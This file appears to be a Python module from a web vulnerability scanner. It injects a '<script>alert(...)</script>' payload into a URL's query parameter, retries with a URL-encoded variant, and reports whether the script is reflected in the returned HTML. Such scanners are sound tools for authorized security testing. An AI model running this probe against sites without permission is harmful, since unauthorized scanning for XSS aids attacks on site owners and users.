import requests
from lib.core.settings import LOGGER


def get_context(url, proxy=None, header=None):
    """ Return the HTML of the site """
    proxies = {"http": proxy}  # Only supports HTTP for now
    agents = {"user-agent": header}
    return requests.get(url, headers=agents, proxies=proxies).text


def create_payload(url, script="alert('test');"):
    """ Create the payload for the URL
    >>> create_payload("http://127.0.0.1/php?id=1")
    http://127.0.0.1/php?id=<script>alert('test');</script> """
    data = url.split("=")
    open_and_close_script = ("<script>", "</script>")
    return data[0] + "=" + open_and_close_script[0] + script + open_and_close_script[1]


def tamper_payload(scripted_url):
    """ If the payload doesn't work we'll try to tamper it
    >>> tamper_payload("http://127.0.0.1/php?id=<script>alert('test');</script>")
    http://127.0.0.1/php?id=%3Cscript%3Ealert(%27test%27)%3B%3C%2Fscript%3E """
    tampered = []
    tampering = {"<": "%3C", ">": "%3E", "'": "%27", ";": "%3B", "/": "%2F"}
    script_to_tamper = scripted_url.split("=")[1]
    url = scripted_url.split("=")[0]
    for char in list(script_to_tamper):
        if char in tampering:
            tampered.append(char.replace(char, tampering[char]))
        else:
            tampered.append(char)
    return url + "=" + ''.join(tampered)


def verify_xss_vulnerable(context, scripted_url):
    """ Verify if there's a vulnerability in the URL by checking
        if the alert exists as is in the HTML, if it does exist that
        means that the URL does not convert the alert
    >>> verify_xss_vulnerable("<HTML>" ,"https://www.google.com/webhp?safe=1")
    False """
    script = scripted_url.split("=")[1]
    if script in context:
        return True
    else:
        LOGGER.warning("Basic tests failed, moving to tampered data..")
        data = tamper_payload(scripted_url)
        url_data_tampered = get_context(data)
        script = data.split("=")[1]
        if script in url_data_tampered:
            return True
        else:
            return False


def main(url, proxy=None, headers=None):
    """ Main """
    html_data = get_context(create_payload(url), proxy=proxy, header=headers)
    scripted_url = create_payload(url)
    return verify_xss_vulnerable(html_data, scripted_url)
